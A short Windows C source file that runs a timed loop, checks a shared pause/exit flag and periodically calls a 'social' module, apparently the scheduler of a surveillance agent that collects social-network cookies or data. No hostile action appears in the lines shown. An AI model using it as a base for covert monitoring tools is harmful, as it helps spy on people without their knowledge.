#define SLEEP_COOKIE 30 // In secondi

#include <Windows.h>
#include "common.h"
#include "bss.h"

extern void SocialMain_init();
void SocialMain_run();

void CheckProcessStatus()
{
	while (shared.social_process_control == SOCIAL_PROCESS_PAUSE)
		Sleep(500);
	if (shared.social_process_control == SOCIAL_PROCESS_EXIT)
		ExitProcess(0);
}

void SocialMainLoop()
{
#ifdef __BUILD_SOCIAL
	SocialMain_init();
#endif
	for (;;) {
		// Busy wait...
		for (int j = 0; j < SLEEP_COOKIE; j++) {
			if (!shared.is_demo_version)
				Sleep(1000);
			else
				Sleep(40);
			CheckProcessStatus();
		}
#ifdef __BUILD_SOCIAL
		SocialMain_run();
#endif
	}
}